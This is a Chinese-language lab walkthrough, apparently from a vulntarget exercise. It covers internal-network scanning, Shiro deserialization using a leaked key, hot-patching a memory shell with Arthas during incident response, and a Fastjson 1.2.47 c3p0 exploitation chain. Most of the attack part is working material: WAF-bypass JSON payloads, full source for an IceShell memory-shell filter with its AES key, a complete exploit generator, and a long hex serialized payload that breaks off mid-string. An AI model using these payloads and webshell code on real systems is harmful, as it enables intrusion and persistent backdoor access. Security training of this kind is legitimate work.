histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########3）source /etc/profile让配置生效生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile7、历史操作命令的清除：history -c但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。

内网渗透
代理配置搭建就忽略了~

发现第二张网卡：192.168.137.20

直接上fscan扫，发现存活IP：192.168.137.10和192.168.137.11

接着再单独扫一下这两个IP，两个均开放了22和80端口


shiro CB链 反序列化192.168.137.11的80端口访问如下：

抓包测试可以发现请求包的 Set-Cookie 中出现 rememberMe=deleteMe，说明存在shiro框架

在前面nacos的配置文件中可以得到shiro的key
#权限认证shiro:  enabled: true  set-login-uri: /login  key: KduO0i+zUIMcNNJnsZwU9Q==

直接工具检测一下发现有可利用链

成功注入内存马


应急响应Ⅱ查看passwd和shadow文件，同样发现一个可疑用户guest


接着再来查看系统日志、登录历史等信息，发现guest用户也在9.26登录过

于是删除guest用户，并且执行get_flag检测失败

接着在/home/vulntarget目录下找到可疑文件app.jar，下载下来反编译看一下即可确认就是这个文件有问题

然后利用工具arthas实现内存马热更新
首先把jar包反编译导出后，将反编译有问题的地方修改下，再把/bin/sh给改一下让它不能执行

接着分别将arthas-boot.jar和arthas-tunnel-server-3.7.1-fatjar.jar以及编译好后解压得到的UserController.class都上传到/tmp目录下，首次运行会出现如下报错：
java -jar arthas-boot.jar[ERROR] Can not read arthas version from: https://arthas.aliyun.com/api/latest_version[ERROR] Can not find Arthas under local: /root/.arthas/lib and remote repo mirror: center[ERROR] Unable to download arthas from remote server, please download the full package according to wiki: https://github.com/alibaba/arthas


这里需要在本地去执行一下，它会将.arthas保存在用户的隐藏文件下

然后再把它打包上传，由于该靶机没有unzip，我们将其打包成tar包，在/root目录下上传并解压
tar -cvf arthas.tar .arthastar -xvf arthas.tar



解压后再去执行就可以成功进入Arthas工具中

最后重新转换已加载的类文件实现热更新，再反编译这个类的源代码，可以发现修改成功了
retransform /tmp/arthas/UserController.classjad --source-only com.example.shiro550.controller.UserController


应急成功，拿下flag2：flag{4b15f4d146ef4c128064f952ba11b874}

fastjson c3p0链 二次序列化接着来看192.168.137.10的就是前面192.168.230.128的web登录页面，探测具体版本发现被拦截了

PS: 前面拿burp的插件直接打bcel没成功应该也是被拦截了的缘故


利用Fastjson默认会去除键、值外的空格、\b、\n、\r、\f等特性，并且还会自动将键与值进行unicode与十六进制解码

在fastjson中，当解析json字符串时，它会自动解码Unicode和hex编码字符。因此我们可以尝试利用该特征来实现编码绕过。我们先来尝试将利用报错回显来判断版本号的poc进行Unicode&#x2F;hex编码，可以看到这里抛出异常显示出fastjson版本号1.2.47，说明可以通过Unicode&#x2F;hex编码成功绕过waf
&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;// 编码前后&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.AutoCloseable&quot;&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;java.lang.AutoCloseable&quot;



或者拿yakit的插件可以检测到其版本为fastjson 1.2.47

现在已知fastjson版本1.2.47，能打的链子就是bcel、c3p0和common-io链，并且测试可知是不出网的，jndi就不适用了，于是尝试利用Unicode编码绕过来打一下bcel，payload如下，tomcat那里需要换着测试

https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat

&#123; &quot;rand1&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot; &#125;, &quot;rand2&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;rand3&quot;: [&#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassLoader&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$……（内存马）&quot; &#125;,&#123;&quot;$ref&quot;:&quot;$[&#x27;rand3&#x27;].connection&quot;&#125;] &#125;Tomcat 8.0以上，org.apache.tomcat.dbcp.dbcp2.BasicDataSourceTomcat 8.0以下，org.apache.tomcat.dbcp.dbcp.BasicDataSourcecommon-dbcp，org.apache.commons.dbcp.BasicDataSource

但是这个应该是没tomcat打不了bcel

然后common-io链靶机应该也没有那么多依赖（估计实战中才会遇到这种，坑很多），所以就只能打c3p0链了，因此下一步探测存在的依赖，利用Character转换报错可以判断存在何种依赖

参考文章：
https://xz.aliyun.com/t/12492#toc-3
https://www.sec-in.com/article/950
https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/

依赖检测项目
org.springframework.web.bind.annotation.RequestMapping  //SpringBootorg.apache.catalina.startup.Tomcat  //Tomcatgroovy.lang.GroovyShell  //Groovy - 1.2.80com.mchange.v2.c3p0.DataSources  //C3P0com.mysql.jdbc.Buffer  //mysql-jdbc-5com.mysql.cj.api.authentication.AuthenticationProvider  //mysql-connect-6com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8sun.nio.cs.GBK  //JDK8java.net.http.HttpClient  //JDK11org.apache.ibatis.type.Alias  //Mybatisorg.apache.tomcat.dbcp.dbcp.BasicDataSource  //tomcat-dbcp-7-BCELorg.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8及以后-BCELorg.apache.commons.io.Charsets       // 存在commons-io,但不确定版本org.apache.commons.io.file.Counters  //commons-io-2.7-2.8org.aspectj.ajde.Ajde  //aspectjtools

RequestMapping本身为SpringBoot下的类，当存在该类时会报出类型转换错误，说明为SpringBoot项目
&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;org.springframework.web.bind.annotation.RequestMapping&quot;    &#125;  &#125;


通过这种方法可以验证出存在c3p0依赖
&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;com.mchange.v2.c3p0.DataSources&quot;    &#125;  &#125;


由于目标不出网，因此需要利用TemplatesImpl来加载恶意字节码。为使该恶意类能够被加载，需从AbstractTranslet类继承，并重写他的两个方法，最后将该类编译为.class文件

fastjson不出网回显利用：https://github.com/depycode/fastjson-c3p0

package sec;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.HashMap;import java.util.Map;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import javax.servlet.DispatcherType;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import sun.misc.BASE64Decoder;public class IceShell extends AbstractTranslet implements Filter &#123;    private final String pa = &quot;3ad2fddfe8bad8e6&quot;;    public IceShell() &#123;    &#125;    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        HttpServletRequest request = (HttpServletRequest)servletRequest;        HttpServletResponse response = (HttpServletResponse)servletResponse;        HttpSession session = request.getSession();        Map&lt;String, Object&gt; pageContext = new HashMap();        pageContext.put(&quot;session&quot;, session);        pageContext.put(&quot;request&quot;, request);        pageContext.put(&quot;response&quot;, response);        ClassLoader cl = Thread.currentThread().getContextClassLoader();        if (request.getMethod().equals(&quot;POST&quot;)) &#123;            Class Lclass;            if (cl.getClass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125;            filterChain.doFilter(servletRequest, servletResponse);        &#125;    &#125;    public void destroy() &#123;    &#125;    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map&lt;String, Object&gt; pageContext) &#123;        byte[] bytecode = Base64.getDecoder().decode(&quot;yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT&quot;);        try &#123;            Method define = Lclass.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);            define.setAccessible(true);            Class uclass = null;            try &#123;                uclass = cl.loadClass(&quot;U&quot;);            &#125; catch (ClassNotFoundException var18) &#123;                uclass = (Class)define.invoke(cl, bytecode, 0, bytecode.length);            &#125;            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);            constructor.setAccessible(true);            Object u = constructor.newInstance(this.getClass().getClassLoader());            Method Um = uclass.getDeclaredMethod(&quot;g&quot;, byte[].class);            Um.setAccessible(true);            String k = &quot;3ad2fddfe8bad8e6&quot;;            session.setAttribute(&quot;u&quot;, k);            Cipher c = Cipher.getInstance(&quot;AES&quot;);            c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));            byte[] eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));            Class eclass = (Class)Um.invoke(u, eClassBytes);            Object a = eclass.newInstance();            Method b = eclass.getDeclaredMethod(&quot;equals&quot;, Object.class);            b.setAccessible(true);            b.invoke(a, pageContext);        &#125; catch (Exception var19) &#123;        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    static &#123;        try &#123;            String name = &quot;AutomneGreet&quot;;            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();            Field Configs = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;filterConfigs&quot;);            Configs.setAccessible(true);            Map filterConfigs = (Map)Configs.get(standardContext);            if (filterConfigs.get(&quot;AutomneGreet&quot;) == null) &#123;                Filter filter = new IceShell();                FilterDef filterDef = new FilterDef();                filterDef.setFilter(filter);                filterDef.setFilterName(&quot;AutomneGreet&quot;);                filterDef.setFilterClass(filter.getClass().getName());                standardContext.addFilterDef(filterDef);                FilterMap filterMap = new FilterMap();                filterMap.addURLPattern(&quot;/shell&quot;);                filterMap.setFilterName(&quot;AutomneGreet&quot;);                filterMap.setDispatcher(DispatcherType.REQUEST.name());                standardContext.addFilterMapBefore(filterMap);                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);                constructor.setAccessible(true);                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);                filterConfigs.put(&quot;AutomneGreet&quot;, filterConfig);            &#125;        &#125; catch (Exception var10) &#123;        &#125;    &#125;&#125;

最终exp如下：
package sec;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class C3P0 &#123;    public static void main(String[] args) throws Exception &#123;        String hex2 = bytesToHex(tobyteArray(gen()));        String FJ1247 = &quot;&#123;\n&quot; +                &quot;    \&quot;a\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +                &quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +                &quot;    &#125;,\n&quot; +                &quot;    \&quot;b\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +                &quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot; + hex2 + &quot;;\&quot;,\n&quot; +                &quot;    &#125;\n&quot; +                &quot;&#125;\n&quot;;        System.out.println(FJ1247);    &#125;    //FastJson原生反序列化加载恶意类字节码    public static Object gen() throws Exception &#123;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CodeAudit\\project\\fastjson\\target\\classes\\sec\\IceShell.class&quot;)); // 读取其中字节即可        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setValue(templates, &quot;_name&quot;, &quot;1&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&quot;val&quot;,jsonArray);        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        return hashMap;    &#125;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    //将类序列化为字节数组    public static byte[] tobyteArray(Object o) throws IOException &#123;        ByteArrayOutputStream bao = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bao);        oos.writeObject(o);   //        return bao.toByteArray();    &#125;    //字节数组转十六进制    public static String bytesToHex(byte[] bytes) &#123;        StringBuffer stringBuffer = new StringBuffer();        for (int i = 0; i &lt; bytes.length; i++) &#123;            String hex = Integer.toHexString(bytes[i] &amp; 0xff);      //bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间            if (hex.length()&lt;2)&#123;                stringBuffer.append(&quot;0&quot; + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误            &#125;else &#123;                stringBuffer.append(hex);            &#125;        &#125;        return stringBuffer.toString();    &#125;&#125;

运行exp即可生成一段json数据：
&#123;    &quot;a&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,        &quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000024e4cafebabe0000003401870a005e00cb0800cc09004b00cd0700ce0700cf0b000400d00700d10a000700cb08007e0b004900d208007a08007c0a00d300d40a00d300d50b000400d60800d70a00d800d90a002400da0a001c00db0a001c00dc0800dd0a004b00de0b00df00e00a00e100e20800e30a00e400e50800e60700e70700a30900e800e90a001c00ea0a00eb00ec0800ed0a002700ee0700ef0700f00a00e800f10a00eb00f20700f30a001c00f40a00f500ec0a001c00f60a00f500f70800f808009c0b00f900fa0800fb0a00fc00fd0700fe0a00d800ff0a003101000a00fc01010701020a003500cb0b000401030a010401050a003501060a00fc01070a001c010808010907010a08010b07010c0a003f010d0b010e010f0701100801110a001c01120800c80a001c01130a011400ec0a011401150701160b004901150701170a004b00cb0701180a004d00cb0a004d01190a004d011a0a004d011b0a0042011c07011d0a005300cb08011e0a0053011f0a0053011a09012001210a012001220a005301230a0042012407012507012607012707012801000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c7365632f4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e73070129010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011707012a07012b07012c0700ce0700cf07012d0701160700f30700e707012e01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f646507012f0700ef07010a0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701300100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013101320100116a6176612f7574696c2f486173684d61700c013301340701350c013601370c013801390c013a013b010004504f535407013c0c0109013d0c013e013f0c0140013f0c0141013b0100156a6176612e6c616e672e436c6173734c6f616465720c0093009407012c0c007001420701430c0144014701026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701480c0149014a01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014b0c014c00730c014d014e07012f0c014f0150010001550c015101520100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015301540c015501560100156a6176612f6c616e672f436c6173734c6f616465720c015701580701590c015a01390c015b015c0100016707012d0c015d015e01000341455307015f0c0160016101001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016201630c006301640c006a016501001673756e2f6d6973632f4241534536344465636f6465720c016601670701680c0169013b0c016a014a0c016b016c0c015b016d010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016e016f0701700c017101720100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017301520c017401750701760c0177017801000d6a6176612f7574696c2f4d617001000c7365632f4963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c0179017a0c017b017c0c017d017c0c017e017f01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0180017c0701810c018201830c00c1013b0c0184017c0c018501860100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e63650100